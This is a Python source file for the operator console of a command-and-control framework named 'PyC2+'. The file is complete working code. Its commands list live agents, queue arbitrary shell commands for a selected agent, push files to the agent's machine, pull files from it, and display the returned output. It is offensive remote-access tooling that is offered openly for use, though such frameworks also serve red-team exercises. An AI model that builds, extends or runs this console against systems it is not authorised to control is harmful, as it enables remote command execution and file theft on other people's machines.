import time
import os
import json
import base64
import threading

from lib.config import agents, tasks, results, result_queues, AGENT_TIMEOUT

# CLI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def cprint(text, color=""):
    print(f"{color}{text}{RESET}")


def start_cli():
    time.sleep(1)

    cprint("\n" + "="*50, CYAN + BOLD)
    cprint("                 PyC2+ CLI", CYAN + BOLD)
    cprint("="*50 + "\n", CYAN + BOLD)
    cprint("Type 'help' for commands or 'exit' to quit.\n", YELLOW)

    selected = None
    stop_live = threading.Event()

    # LIVE OUTPUT THREAD
    def live_thread():
        while not stop_live.is_set():
            if not selected:
                time.sleep(0.2)
                continue

            q = result_queues.get(selected)
            if not q:
                time.sleep(0.2)
                continue

            try:
                entry = q.get(timeout=0.2)
            except:
                continue

            cprint(f"\n[{entry['timestamp']}]", YELLOW)
            cprint(entry["result"], CYAN)

    threading.Thread(target=live_thread, daemon=True).start()

    def prompt():
        if selected:
            return f"\n{RED}[PyC2+ | {selected}]{RESET}{RED}> "
        return f"\n{RED}[PyC2+]{RESET}{RED}> "

    def check_agent_selected_and_online():
        if not selected:
            cprint("[!] Select agent first.", RED)
            return False
        last_seen = agents.get(selected, {}).get("last_seen", 0)
        if time.time() - last_seen > AGENT_TIMEOUT:
            cprint("[!] Agent offline.", RED)
            return False
        return True

    def handle_put(cmd):
        if not check_agent_selected_and_online():
            return

        try:
            _, local, remote = cmd.split(maxsplit=2)
        except ValueError:
            cprint("[!] Usage: put <local_path> <remote_filename>", RED)
            return

        if not os.path.isfile(local):
            cprint("[!] Local file not found.", RED)
            return

        with open(local, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()

        payload = json.dumps({"type": "put", "filename": remote, "data": b64})
        tasks[selected].put(payload)
        cprint(f"[+] Uploaded {local} → {remote} (queued for agent)", GREEN)

    def handle_get(cmd):
        if not check_agent_selected_and_online():
            return

        remote_path = cmd[len("get "):].strip()
        payload = json.dumps({"type": "get", "path": remote_path})
        tasks[selected].put(payload)
        cprint(f"[+] Requested file: {remote_path}", GREEN)

    def handle_send(cmd):
        if not check_agent_selected_and_online():
            return

        command = cmd[len("send "):]
        tasks[selected].put(command)
        cprint(f"[+] Command queued for agent: {command}", GREEN)

    def handle_history():
        if not selected:
            cprint("[!] No agent selected.", RED)
            return
        for e in results.get(selected, []):
            cprint(f"\n[{e['timestamp']}]", YELLOW)
            cprint(e["result"], CYAN)

    # MAIN LOOP
    while True:
        try:
            cmd = input(prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            cprint("\nExiting PyC2+ CLI...", YELLOW)
            stop_live.set()
            break

        if not cmd:
            continue

        if cmd == "help":
            cprint("\nAvailable commands:", CYAN + BOLD)
            cprint("  agents                   - list all agents", GREEN)
            cprint("  select <id>              - select an agent", GREEN)
            cprint("  send <command>           - send shell command to agent", GREEN)
            cprint("  put <local> <remote>     - upload file to agent", GREEN)
            cprint("  get <remote_path>        - download file from agent", GREEN)
            cprint("  history                  - show stored results for selected agent", GREEN)
            cprint("  exit                     - quit CLI\n", GREEN)
            continue

        if cmd == "agents":
            live = [
                aid for aid, info in agents.items()
                if time.time() - info.get("last_seen", 0) <= AGENT_TIMEOUT
            ]
            if not live:
                cprint("[!] No agents connected.", RED)
            else:
                cprint("\nConnected agents:", CYAN)
                for a in live:
                    cprint(f"  → {a}", YELLOW)
            continue

        if cmd.startswith("select "):
            aid = cmd.split(maxsplit=1)[1]
            last_seen = agents.get(aid, {}).get("last_seen", 0)
            if aid in agents and time.time() - last_seen <= AGENT_TIMEOUT:
                selected = aid
                cprint(f"[+] Selected agent: {aid}", GREEN)
                # Clear queued live output
                with result_queues[aid].mutex:
                    result_queues[aid].queue.clear()
            else:
                cprint("[!] Invalid or offline agent.", RED)
            continue

        if cmd.startswith("put "):
            handle_put(cmd)
            continue

        if cmd.startswith("get "):
            handle_get(cmd)
            continue

        if cmd.startswith("send "):
            handle_send(cmd)
            continue

        if cmd == "history":
            handle_history()
            continue

        if cmd == "exit":
            cprint("Leaving CLI...", YELLOW)
            stop_live.set()
            break

        cprint("[!] Unknown command.", RED)
